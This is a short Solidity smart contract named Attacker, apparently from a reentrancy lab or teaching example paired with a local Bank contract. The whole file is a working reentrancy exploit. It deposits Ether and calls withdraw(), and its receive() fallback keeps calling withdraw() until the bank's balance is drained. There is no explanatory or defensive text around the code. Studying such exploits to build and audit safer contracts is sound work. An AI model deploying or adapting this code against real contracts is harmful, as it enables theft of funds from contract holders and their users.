// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./Bank.sol";

contract Attacker {
    Bank private bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
